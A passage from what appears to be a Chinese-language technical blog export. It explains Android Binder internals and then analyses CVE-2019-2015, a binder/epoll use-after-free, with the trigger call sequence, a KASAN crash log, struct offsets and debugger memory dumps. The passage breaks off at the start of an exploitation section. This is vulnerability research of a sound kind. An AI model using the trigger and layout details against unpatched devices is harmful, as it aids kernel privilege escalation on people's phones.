class=\"comment\">\t\t * bitfield elements protected by</span></span><br><span class=\"line\"><span class=\"comment\">\t\t * proc inner_lock</span></span><br><span class=\"line\"><span class=\"comment\">\t\t */</span></span><br><span class=\"line\">\t\tu8 has_strong_ref:<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tu8 pending_strong_ref:<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tu8 has_weak_ref:<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tu8 pending_weak_ref:<span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t\t * invariant after initialization</span></span><br><span class=\"line\"><span class=\"comment\">\t\t */</span></span><br><span class=\"line\">\t\tu8 accept_fds:<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tu8 txn_security_ctx:<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tu8 min_priority;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> has_async_transaction;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span> <span class=\"title\">async_todo</span>;</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n\n<ol>\n<li></li>\n<li>ProcessState::self()<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sp&lt;ProcessState&gt; ProcessState::self()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Mutex::Autolock _l(gProcessMutex);</span><br><span class=\"line\">    if (gProcess != nullptr) &#123;</span><br><span class=\"line\">        return gProcess;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    gProcess = new ProcessState(kDefaultDriver);</span><br><span class=\"line\">    return gProcess;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ProcessState::ProcessState(const char *driver)</span><br><span class=\"line\">    : mDriverName(String8(driver))</span><br><span class=\"line\">    , mDriverFD(open_driver(driver))</span><br><span class=\"line\">    , mVMStart(MAP_FAILED)</span><br><span class=\"line\">    , mThreadCountLock(PTHREAD_MUTEX_INITIALIZER)</span><br><span class=\"line\">    , mThreadCountDecrement(PTHREAD_COND_INITIALIZER)</span><br><span class=\"line\">    , mExecutingThreadsCount(0)</span><br><span class=\"line\">    , mMaxThreads(DEFAULT_MAX_BINDER_THREADS)</span><br><span class=\"line\">    , mStarvationStartTimeMs(0)</span><br><span class=\"line\">    , mManagesContexts(false)</span><br><span class=\"line\">    , mBinderContextCheckFunc(nullptr)</span><br><span class=\"line\">    , mBinderContextUserData(nullptr)</span><br><span class=\"line\">    , mThreadPoolStarted(false)</span><br><span class=\"line\">    , mThreadPoolSeq(1)</span><br><span class=\"line\">    , mCallRestriction(CallRestriction::NONE)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (mDriverFD &gt;= 0) &#123;</span><br><span class=\"line\">        // mmap the binder, providing a chunk of virtual address space to receive transactions.</span><br><span class=\"line\">        //私有的，可读不可写</span><br><span class=\"line\">        mVMStart = mmap(nullptr, BINDER_VM_SIZE, PROT_READ, MAP_PRIVATE | MAP_NORESERVE, mDriverFD, 0);</span><br><span class=\"line\">        if (mVMStart == MAP_FAILED) &#123;</span><br><span class=\"line\">            // *sigh*</span><br><span class=\"line\">            ALOGE(&quot;Using %s failed: unable to mmap transaction memory.\\n&quot;, mDriverName.c_str());</span><br><span class=\"line\">            close(mDriverFD);</span><br><span class=\"line\">            mDriverFD = -1;</span><br><span class=\"line\">            mDriverName.clear();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    LOG_ALWAYS_FATAL_IF(mDriverFD &lt; 0, &quot;Binder driver could not be opened.  Terminating.&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ProcessState::~ProcessState()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (mDriverFD &gt;= 0) &#123;</span><br><span class=\"line\">        if (mVMStart != MAP_FAILED) &#123;</span><br><span class=\"line\">            munmap(mVMStart, BINDER_VM_SIZE);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        close(mDriverFD);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    mDriverFD = -1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n</ol>\n<p>service_manager</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">binder_write</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">for</span><span class=\"params\">(::)</span></span><br><span class=\"line\">    <span class=\"title function_\">binder_read</span><span class=\"params\">()</span>;? <span class=\"comment\">//什么进行了阻塞？</span></span><br><span class=\"line\"></span><br><span class=\"line\">    binder_parse();</span><br></pre></td></tr></table></figure>\n<p>一句话总结：servicemanager 是通过 ioctl(fd, BINDER_SET_CONTEXT_MGR) 向内核注册了自己的 BBinder 对象，成为了 handle 0，</p>\n<h3 id=\"获取binder服务\"><a href=\"#获取binder服务\" class=\"headerlink\" title=\"获取binder服务\"></a>获取binder服务</h3><figure class=\"highlight cpp\"><figcaption><span>懒汉式单例模式</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> sp&lt;ProcessState&gt; gProcess;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">sp&lt;ProcessState&gt; <span class=\"title\">ProcessState::self</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    Mutex::Autolock _l(gProcessMutex);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (gProcess != <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> gProcess;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    gProcess = <span class=\"keyword\">new</span> <span class=\"built_in\">ProcessState</span>(kDefaultDriver);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> gProcess;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ProcessState::<span class=\"built_in\">ProcessState</span>()</span><br><span class=\"line\">    : <span class=\"built_in\">mDriverFD</span>(<span class=\"built_in\">open_driver</span>(driver))</span><br><span class=\"line\">    , <span class=\"built_in\">mVMStart</span>(MAP_FAILED)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mDriverFD &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// mmap the binder, providing a chunk of virtual address space to receive transactions.</span></span><br><span class=\"line\">        mVMStart = <span class=\"built_in\">mmap</span>(<span class=\"literal\">nullptr</span>, BINDER_VM_SIZE, PROT_READ, MAP_PRIVATE | MAP_NORESERVE, mDriverFD, <span class=\"number\">0</span>);</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>mmap 的作用是 将 binder 驱动程序提供的一块内存映射到用户空间的虚拟地址空间中，以便用户空间进程可以通过这块内存与 binder 驱动进行通信。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌────────────────────────────┐</span><br><span class=\"line\">│        App 进程            │</span><br><span class=\"line\">│  - open /dev/binder        │</span><br><span class=\"line\">│  - mmap 内存区域 A         │◄──┐</span><br><span class=\"line\">└────────────────────────────┘   │</span><br><span class=\"line\">                                 │</span><br><span class=\"line\">┌────────────────────────────┐   │</span><br><span class=\"line\">│     system_server 进程      │   │</span><br><span class=\"line\">│  - open /dev/binder         │   │</span><br><span class=\"line\">│  - mmap 内存区域 B          │◄──┤</span><br><span class=\"line\">└────────────────────────────┘   │</span><br><span class=\"line\">                                 │</span><br><span class=\"line\">┌────────────────────────────┐   │  通过 ioctl + mmap 进行通信</span><br><span class=\"line\">│     servicemanager 进程     │   │</span><br><span class=\"line\">│  - open /dev/binder         │   │</span><br><span class=\"line\">│  - mmap 内存区域 C          │◄──┘</span><br><span class=\"line\">└────────────────────────────┘</span><br><span class=\"line\"></span><br><span class=\"line\">         ▲</span><br><span class=\"line\">         │</span><br><span class=\"line\">   ┌─────────────┐</span><br><span class=\"line\">   │  binder 驱动 │（内核空间）</span><br><span class=\"line\">   └─────────────┘</span><br></pre></td></tr></table></figure>\n\n\n<p>返回BpBinder</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">sp&lt;IBinder&gt; <span class=\"title\">ProcessState::getStrongProxyForHandle</span><span class=\"params\">(<span class=\"type\">int32_t</span> handle)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        handle_entry* e = <span class=\"built_in\">lookupHandleLocked</span>(handle);</span><br><span class=\"line\">            b = BpBinder::<span class=\"built_in\">create</span>(handle);</span><br><span class=\"line\">                        e-&gt;binder = b;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (b) e-&gt;refs = b-&gt;<span class=\"built_in\">getWeakRefs</span>();</span><br><span class=\"line\">            result = b;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>BpBinder 转为 IServiceManager 即BpBinderServiceManager</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> INTERFACE&gt;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> sp&lt;INTERFACE&gt; <span class=\"title\">interface_cast</span><span class=\"params\">(<span class=\"type\">const</span> sp&lt;IBinder&gt;&amp; obj)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> INTERFACE::<span class=\"built_in\">asInterface</span>(obj);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//函数名展开为：</span></span><br><span class=\"line\">IServiceManager::<span class=\"built_in\">asInterface</span>(<span class=\"built_in\">sp</span>&lt;IBinder&gt;(<span class=\"keyword\">new</span> <span class=\"built_in\">BpBinder</span>(<span class=\"number\">0</span>)))</span><br><span class=\"line\"><span class=\"comment\">//而此函数</span></span><br><span class=\"line\"><span class=\"comment\">// 由宏DECLARE_META_INTERFACE 在 IServiceManager.h 实现</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 由宏IMPLEMENT_META_INTERFACE 在 IServiceManager.cpp实现</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在 IServiceManager.h</span></span><br><span class=\"line\"><span class=\"built_in\">DECLARE_META_INTERFACE</span>(ServiceManager)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在 IServiceManager.cpp</span></span><br><span class=\"line\"><span class=\"built_in\">IMPLEMENT_META_INTERFACE</span>(ServiceManager, <span class=\"string\">&quot;android.os.IServiceManager&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//函数体最终展开为：</span></span><br><span class=\"line\"><span class=\"function\">sp&lt;IServiceManager&gt; <span class=\"title\">IServiceManager::asInterface</span><span class=\"params\">(<span class=\"type\">const</span> sp&lt;IBinder&gt;&amp; obj)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">BpServiceManager</span>(obj);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>defaultServiceManager() 返回的是 BpServiceManager，因为它通过 interface_cast<IServiceManager>() 把一个 BpBinder(0)（远端的 servicemanager 代理）转换成了一个 BpServiceManager 类型的对象。</p>\n<p>这个 BpServiceManager 是 servicemanager 的客户端代理，它包装了所有 Binder 通信细节（比如 transact(CHECK_SERVICE)），供 App 或 System Server 调用。</p>\n<p>每个进程如果要注册服务，都会创建自己的 BpServiceManager 实例，用来通过 Binder 向 servicemanager 发起 addService() 等调用。<br>注意：<br>    •    虽然每个进程都会 构造一个 BpServiceManager 对象，但这个对象内部都指向 同一个远程 Binder 节点（handle=0），也就是 servicemanager；<br>    •    所以每个进程只是创建了一个“代理对象”，而不是实际的服务管理器本体；<br>    •    真正提供服务注册逻辑的，是 servicemanager 进程中的 BnServiceManager::onTransact()。</p>\n<h2 id=\"附录\"><a href=\"#附录\" class=\"headerlink\" title=\"附录\"></a>附录</h2>"},{"_content":"\nAndroid:\n#UAF #binder\nCVE-2019-2015:\nhttps://cloudfuzz.github.io/android-kernel-exploitation/chapters/vulnerability-discovery.html\nhttps://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html\n","source":"_drafts/POC/readme.md","raw":"\nAndroid:\n#UAF #binder\nCVE-2019-2015:\nhttps://cloudfuzz.github.io/android-kernel-exploitation/chapters/vulnerability-discovery.html\nhttps://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html\n","slug":"POC/readme","published":0,"date":"2025-06-05T14:48:51.204Z","updated":"2025-06-05T14:48:51.204Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit4000vv8fy2m978gix","content":"<p>Android:<br>#UAF #binder<br>CVE-2019-2015:<br><a href=\"https://cloudfuzz.github.io/android-kernel-exploitation/chapters/vulnerability-discovery.html\">https://cloudfuzz.github.io/android-kernel-exploitation/chapters/vulnerability-discovery.html</a><br><a href=\"https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html\">https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html</a></p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>Android:<br>#UAF #binder<br>CVE-2019-2015:<br><a href=\"https://cloudfuzz.github.io/android-kernel-exploitation/chapters/vulnerability-discovery.html\">https://cloudfuzz.github.io/android-kernel-exploitation/chapters/vulnerability-discovery.html</a><br><a href=\"https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html\">https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html</a></p>\n"},{"_content":"## UAF暴露 test.c\n\n1. epoll 注册 Binder 的 wait queue\n\n测试程序中，你首先做了：\n```c\nfd = open(\"/dev/binder\", O_RDONLY);\nepfd = epoll_create(1000);\nstruct epoll_event ev = { .events = EPOLLIN };\nepoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);\n```\n*\tbinder_poll() 会被调用\n*\t在内部，它会执行类似下面的操作，把 Binder 线程的 wait_queue_head_t wait 加入到 epoll 的等待队列：\n```c\n/* approx. pseudo-code */\npoll_wait(file, &thread->wait, wait);\n```\n\n*\t这时 thread->wait 被添加到 epoll 的内部数据结构中，以便 Binder 产生事件时唤醒你的程序。\n\n⸻\n\n2. 用户态发出 BINDER_THREAD_EXIT，释放 Binder 线程对象\n\n紧接着，测试程序调用：\n```c\nioctl(fd, BINDER_THREAD_EXIT, NULL);\n```\n在 Binder 驱动里，这会走到 ```binder_thread_release()```，其核心逻辑大致是：\n```c\nstatic void binder_thread_release(struct binder_thread *thread) {\n    /* …pre-cleanup… */\n    kfree(thread);    // <-- 这里释放了 binder_thread 对象（包括其中的 wait 字段）\n    /* …post-cleanup… */\n}\n```\n🚩 此时 ```thread->wait```（即 epoll 队列中的 wait_queue）已经被释放。\n\n⸻\n\n3. 进程退出，epoll 对象被关闭\n\n当 new.out 结束时，它的文件描述符自动被关闭，走进 __fput() 分支，针对 epoll FD 会调用：\n```c\n__fput(file)  ──>  ep_eventpoll_release(file->private_data)\n```\n*\tep_eventpoll_release() 会释放 epoll 实例；\n*\t它内部调用 ep_free(), 又调用 ep_unregister_pollwait()；\n*\t再往里最终会执行：\n```c\nremove_wait_queue(&thread->wait, &poll_entry->wait);  // <-- 这里\n```\n\n*\t但 thread 已经被 kfree 掉，&thread->wait 已经是野指针，随即 remove_wait_queue() 试图给这个野指针上的 spinlock 加锁并写链表指针，触发 use-after-free。\n\n⸻\n\n4. KASAN 报告\n\n日志中你看到：\n\n```\n[   77.771718] ==================================================================\n[   77.773904] BUG: KASAN: use-after-free in remove_wait_queue+0x1d4/0x1f0\n[   77.774237] Write of size 8 at addr ffff8000d3062128 by task test/1351\n[   77.774506] \n[   77.774991] CPU: 0 PID: 1351 Comm: test Not tainted 4.14.16-00144-g7a3cee43e935-dirty #3\n[   77.775385] Hardware name: linux,dummy-virt (DT)\n[   77.776218] Call trace:\n[   77.776427] [<ffff200008092658>] dump_backtrace+0x0/0x4c0\n[   77.776715] [<ffff200008092b2c>] show_stack+0x14/0x20\n[   77.776943] [<ffff200009c4b3ec>] dump_stack+0x110/0x18c\n[   77.777157] [<ffff20000849f5dc>] print_address_description+0x64/0x258\n[   77.777381] [<ffff20000849f048>] kasan_report+0x158/0x308\n[   77.777577] [<ffff20000849f354>] __asan_report_store8_noabort+0x1c/0x28\n[   77.777790] [<ffff2000081f514c>] remove_wait_queue+0x1d4/0x1f0\n[   77.777962] [<ffff2000085cea88>] ep_unregister_pollwait.isra.0+0x1b8/0x308\n[   77.778153] [<ffff2000085d1e40>] ep_free+0xf0/0x210\n[   77.778365] [<ffff2000085d1f8c>] ep_eventpoll_release+0x2c/0x48\n[   77.778618] [<ffff2000084f7734>] __fput+0x22c/0x620\n[   77.778800] [<ffff2000084f7bac>] ____fput+0xc/0x18\n[   77.778978] [<ffff20000818a020>] task_work_run+0x150/0x1d8\n[   77.779174] [<ffff200008140114>] do_exit+0x73c/0x1208\n[   77.779360] [<ffff200008140d30>] do_group_exit+0x108/0x2b0\n[   77.779590] [<ffff200008140ef4>] SyS_exit_group+0x1c/0x20\n[   77.779951] Exception stack(0xffff8000d3b1fec0 to 0xffff8000d3b20000)\n```\n这正是上面第 3 步中，remove_wait_queue() 在一个已经被 kfree 的 wait_queue_head_t 上操作导致的野指针写，KASAN 立刻捕捉到，并在尝试解除锁链时崩溃。\n\n⸻\n\n漏洞触发总结\n1.\tepoll_ctl(ADD) 调用 binder_poll，将 thread->wait 加入 epoll 等待列表。\n2.\tioctl(BINDER_THREAD_EXIT) 释放 binder_thread 结构（包含 wait 字段）。\n3.\t进程退出 / epoll FD 关闭 时，ep_eventpoll_release 调用 remove_wait_queue(&thread->wait, …)。\n4.\tthread->wait 已被释放，remove_wait_queue 执行 UAF 写操作，KASAN 捕获并报错。\n\n⸻\n\n代码位置参考\n•\t注册 wait queue：drivers/android/binder.c 中的 binder_poll() → poll_wait(…, &thread->wait, …)\n•\t释放线程：drivers/android/binder.c 中的 binder_thread_release() → kfree(thread)\n•\t清理 epoll：fs/eventpoll.c 中的 ep_eventpoll_release() → ep_free() → ep_unregister_pollwait() → remove_wait_queue()\n\n\n## UAF利用 poc.c\n\n\nbinder_thread\n\n结构体\n```c\nstruct binder_thread {\n\tstruct binder_proc *proc; //0x8\n\tstruct rb_node rb_node; //0x18\n\tstruct list_head waiting_thread_node; //0x10\n\tint pid;//0x4\n\tint looper; //0x4             /* only modified by this thread */\n\tbool looper_need_return; /* can be written by other thread */ //0x1 实际 0x8\n\tstruct binder_transaction *transaction_stack; //0x8\n\tstruct list_head todo; //0x10\n\tstruct binder_error return_error;//0x20\n\tstruct binder_error reply_error;//0x20\n\twait_queue_head_t wait;//0x18\n\tstruct binder_stats stats;//0xcc\n\tatomic_t tmp_ref;//0x4\n\tbool is_dead;//0x1\n};\n\n\n```\n调试显示\n```\n(remote) gef➤  print *thread\n$3 = {\n  proc = 0xffff8000d63c3c80,\n  rb_node = {\n    __rb_parent_color = 0x1,\n    rb_right = 0x0,\n    rb_left = 0x0\n  },\n  waiting_thread_node = {\n    next = 0xffff8000d30c58a0,\n    prev = 0xffff8000d30c58a0\n  },\n  pid = 0x545,\n  looper = 0x20,\n  looper_need_return = 0x1,\n  transaction_stack = 0x0,\n  todo = {\n    next = 0xffff8000d30c58c8,\n    prev = 0xffff8000d30c58c8\n  },\n  return_error = {\n    work = {\n      entry = {\n        next = 0x0,\n        prev = 0x0\n      },\n      type = BINDER_WORK_RETURN_ERROR\n    },\n    cmd = 0x7201\n  },\n  reply_error = {\n    work = {\n      entry = {\n        next = 0x0,\n        prev = 0x0\n      },\n      type = BINDER_WORK_RETURN_ERROR\n    },\n    cmd = 0x7201\n  },\n  wait = {\n    lock = {\n      {\n        rlock = {\n          raw_lock = {\n            owner = 0x1,\n            next = 0x1\n          }\n        }\n      }\n    },\n    head = {\n      next = 0xffff8000d3924038,\n      prev = 0xffff8000d3924038\n    }\n  },\n  stats = {\n    br = {{\n        counter = 0x0\n      } <repeats 18 times>},\n    bc = {{\n        counter = 0x0\n      } <repeats 19 times>},\n    obj_created = {{\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }},\n    obj_deleted = {{\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }, {\n        counter = 0x0\n      }}\n  },\n  tmp_ref = {\n    counter = 0x0\n  },\n  is_dead = 0x0\n}\n(remote) gef➤  print sizeof(*thread)\n$4 = 0x188\n\n(remote) gef➤  print thread\n$8 = (struct binder_thread *) 0xffff8000d30c5880\n\n(remote) gef➤  print &(thread->wait)\n$6 = (wait_queue_head_t *) 0xffff8000d30c5918\n\n(remote) gef➤  print &(thread->wait->head)\n$7 = (struct list_head *) 0xffff8000d30c5920\n\n(remote) gef➤  x/31gx thread  -->小端展示，低位低地址\n0xffff8000d30c5880:\t0xffff8000d63c3c80\t0x0000000000000001\n0xffff8000d30c5890:\t0x0000000000000000\t0x0000000000000000\n0xffff8000d30c58a0:\t0xffff8000d30c58a0\t0xffff8000d30c58a0\n0xffff8000d30c58b0:\t0x0000002000000545\t0x0000000000000001\n0xffff8000d30c58c0:\t0x0000000000000000\t0xffff8000d30c58c8\n0xffff8000d30c58d0:\t0xffff8000d30c58c8\t0x0000000000000000\n0xffff8000d30c58e0:\t0x0000000000000000\t0x0000000000000003\n0xffff8000d30c58f0:\t0x0000000000007201\t0x0000000000000000\n0xffff8000d30c5900:\t0x0000000000000000\t0x0000000000000003\n0xffff8000d30c5910:\t0x0000000000007201\t0x0000000000010001\n0xffff8000d30c5920:\t0xffff8000d3924038\t0xffff8000d3924038\n0xffff8000d30c5930:\t0x0000000000000000\t0x0000000000000000\n0xffff8000d30c5940:\t0x0000000000000000\t0x0000000000000000\n0xffff8000d30c5950:\t0x0000000000000000\t0x0000000000000000\n0xffff8000d30c5960:\t0x0000000000000000\t0x0000000000000000\n0xffff8000d30c5970:\t0x0000000000000000\n```\n\n 哪里持有 binder_thread->wait\n\n ```c \n // fs/eventpoll.c\nSYSCALL_DEFINE4(epoll_ctl, int, epfd, int, op, int, fd,\n\t\tstruct epoll_event __user *, event)\n{\n  \tswitch (op) {\n\t  case EPOLL_CTL_ADD:\n\t\t\terror = ep_insert(ep, &epds, tf.file, fd, full_check);\n\n}\n\nstatic int ep_insert(struct eventpoll *ep, struct epoll_event *event,\n\t\t     struct file *tfile, int fd, int full_check)\n{\n  \tep_set_ffd(&epi->ffd, tfile, fd);// poll: file\n  \tinit_poll_funcptr(&epq.pt, ep_ptable_queue_proc); // poll: poll_table\n\n\trevents = ep_item_poll(epi, &epq.pt);\n\n}\n\nstatic inline unsigned int ep_item_poll(struct epitem *epi, poll_table *pt)\n{\n\tpt->_key = epi->event.events;\n  //调用binder fd的 poll 方法\n\treturn epi->ffd.file->f_op->poll(epi->ffd.file, pt) & epi->event.events;\n}\n\n// ----> 调用到 /drivers/android/binder.c\nstatic unsigned int binder_poll(struct file *filp,\n\t\t\t\tstruct poll_table_struct *wait)\n{\n  \tpoll_wait(filp, &thread->wait, wait);\n}\n\n// ----> 调用到 /include/linux/poll.h\nstatic inline void poll_wait(struct file * filp, wait_queue_head_t * wait_address, poll_table *p)\n{\n\tif (p && p->_qproc && wait_address)\n\t\tp->_qproc(filp, wait_address, p);\n}\n// ----> 即回调到 /fs/eventpoll.c\n//[#0] 0xffff0000082492f0 → ep_ptable_queue_proc(file=0xffff8000fae61900, whead=0xffff8000f8bb6c98, pt=0xffff00000ace3ea8)\nstatic void ep_ptable_queue_proc(struct file *file, wait_queue_head_t *whead,\n\t\t\t\t poll_table *pt)\n{\n\tstruct epitem *epi = ep_item_from_epqueue(pt);\n\tstruct eppoll_entry *pwq;\n\n\tif (epi->nwait >= 0 && (pwq = kmem_cache_alloc(pwq_cache, GFP_KERNEL))) {\n\t\tinit_waitqueue_func_entry(&pwq->wait, ep_poll_callback);\n\t\tpwq->whead = whead;\n\t\tpwq->base = epi;\n\t\tif (epi->event.events & EPOLLEXCLUSIVE)\n\t\t\tadd_wait_queue_exclusive(whead, &pwq->wait);\n\t\telse\n\t\t\tadd_wait_queue(whead, &pwq->wait);\n\t\tlist_add_tail(&pwq->llink, &epi->pwqlist);\n\t\tepi->nwait++;\n\t} else {\n\t\t/* We have to signal that an error occurred */\n\t\tepi->nwait = -1;\n\t}\n}\n//把epoll的wwait_queue_entry_t 加入到以binder_thread->wait(whead)头为准的队列中，且此头指针被eppoll_entry->whead持有\n\n//此eppoll_entry 